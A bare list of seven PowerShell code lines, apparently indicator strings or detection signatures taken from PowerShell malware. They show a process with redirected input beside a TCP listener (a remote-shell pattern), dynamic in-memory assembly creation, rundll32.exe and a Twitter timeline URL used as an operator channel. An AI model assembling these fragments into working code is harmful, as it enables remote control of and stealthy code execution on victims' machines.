$p = New-Object System.Diagnostics.Process
$s.AcceptTcpClient()
$p.StartInfo.RedirectStandardInput = 1
$a = [AppDomain]::CurrentDomain.DefineDynamicAssembly($n, $access)
$m = $a.DefineDynamicModule('module')
$program = 'rundll32.exe'
$url = 'http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=operator'

